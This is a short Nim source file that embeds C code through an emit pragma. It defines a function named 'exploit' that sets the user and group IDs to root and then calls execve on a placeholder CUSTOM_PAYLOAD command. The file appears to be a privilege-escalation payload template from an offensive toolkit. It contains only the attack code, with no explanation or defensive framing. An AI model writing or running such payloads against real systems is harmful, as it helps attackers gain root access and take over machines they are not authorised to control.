when not defined(c):
    {.error: "Must be compiled in c mode"}

{.emit: """
#include <sys/types.h>
#include <unistd.h>
void exploit() {
    char * my_args[] = { CUSTOM_PAYLOAD NULL };
    setuid(0);
    setgid(0);
    execve(my_args[0], my_args, 0);
}
""".}
proc Exploit(): void
    {.importc: "exploit", nodecl.}
when isMainModule:
    Exploit()
